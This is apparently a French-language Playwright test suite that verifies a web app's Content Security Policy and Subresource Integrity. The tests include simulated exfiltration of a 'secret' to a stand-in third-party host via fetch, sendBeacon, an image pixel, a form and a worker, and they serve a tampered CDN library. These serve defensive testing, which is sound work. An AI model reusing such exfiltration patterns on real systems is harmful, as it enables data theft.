// Confidentialité imposée par le navigateur : la CSP bloque toute fuite vers un
// serveur tiers, et une bibliothèque modifiée est refusée (SRI).
// On vérifie les événements de violation de la CSP eux-mêmes : un simple échec
// de requête ne prouverait rien (le réseau peut être coupé pour d'autres raisons).
'use strict';

const { test, expect, ouvrirApp } = require('./aide');

const SERVEUR_TIERS = 'https://exemple.fr';

test('la CSP est en place et n\'autorise aucune destination arbitraire', async ({ page }) => {
  await ouvrirApp(page);
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
  expect(csp).toContain("default-src 'none'");
  expect(csp).toContain("form-action 'none'");
  const connect = csp.split(';').find(d => d.trim().startsWith('connect-src'));
  expect(connect).not.toMatch(/\*|https:(\s|$)/);   // ni joker, ni « tout https »
});

test('envoi de données vers un serveur tiers bloqué (fetch, sendBeacon, image, formulaire)', async ({ page }) => {
  page.securiteAttendue = true;
  await ouvrirApp(page);
  const bloquees = await page.evaluate(async tiers => {
    await fetch(`${tiers}/fuite`, { method: 'POST', body: 'secret' }).catch(() => {});
    navigator.sendBeacon(`${tiers}/balise`, 'secret');
    new Image().src = `${tiers}/pixel.png?d=secret`;
    const f = Object.assign(document.createElement('form'), { action: `${tiers}/formulaire`, method: 'post' });
    document.body.appendChild(f);
    f.submit();
    await new Promise(r => setTimeout(r, 300));
    return window.__violationsCsp;
  }, SERVEUR_TIERS);
  for (const [directive, chemin] of [['connect-src', '/fuite'], ['connect-src', '/balise'], ['img-src', '/pixel.png'], ['form-action', '/formulaire']]) {
    expect(bloquees.some(v => v.directive === directive && v.url.startsWith(SERVEUR_TIERS + chemin)), `${directive} ${chemin}`).toBe(true);
  }
});

test('les workers sont soumis à la même CSP', async ({ page }) => {
  page.securiteAttendue = true;
  await ouvrirApp(page);
  const violation = await page.evaluate(tiers => new Promise(resolve => {
    const code = `self.addEventListener('securitypolicyviolation', e => postMessage(e.effectiveDirective + ' ' + e.blockedURI));
                  fetch('${tiers}/fuite-worker').catch(() => {});`;
    new Worker(URL.createObjectURL(new Blob([code], { type: 'text/javascript' }))).onmessage = e => resolve(e.data);
  }), SERVEUR_TIERS);
  expect(violation).toBe(`connect-src ${SERVEUR_TIERS}/fuite-worker`);
});

test('bibliothèque modifiée sur le CDN : refusée par le navigateur', async ({ page }) => {
  page.securiteAttendue = true;
  await page.route('**/jszip.min.js', route => route.fulfill({
    contentType: 'text/javascript', body: 'window.JSZip = { piege: "code malveillant exécuté" };',
  }));
  await page.goto('index.html');
  await page.waitForFunction(() => window.XLSX && window.pdfjsLib);
  expect(await page.evaluate(() => window.JSZip)).toBeUndefined();
  await expect(page.locator('#bandeau-cdn')).toContainText('JSZip');
});

test('scripts chargés hors balise : vérifiés, refusés sans empreinte ou si modifiés', async ({ page }) => {
  page.securiteAttendue = true;
  await ouvrirApp(page);
  // Worker de PDF.js lancé depuis la copie vérifiée (blob:), et non depuis le CDN
  await page.evaluate(() => traiterFichiers([Fab.pdf('a.pdf', [[{ t: 'Bonjour le monde entier', x: 72, y: 700 }]])]));
  expect(await page.evaluate(() => pdfjsLib.GlobalWorkerOptions.workerSrc)).toMatch(/^blob:/);

  const refus = await page.evaluate(async () => {
    const essai = url => scriptVerifie(url).then(() => 'accepté', e => e.message);
    const inconnu = await essai('https://cdnjs.cloudflare.com/ajax/libs/autre/1.0.0/autre.min.js');
    // Empreinte attendue d'un fichier connu, mais contenu servi différent
    const url = Object.keys(INTEGRITE).find(u => u.includes('papaparse'));
    const original = INTEGRITE[url];
    INTEGRITE[url] = 'sha384-' + btoa('x'.repeat(48));
    const modifie = await essai(url);
    INTEGRITE[url] = original;
    return { inconnu, modifie, valide: await essai(url) };
  });
  expect(refus.inconnu).toMatch(/^aucune empreinte connue/);
  expect(refus.modifie).not.toBe('accepté');
  expect(refus.valide).toBe('accepté');
});
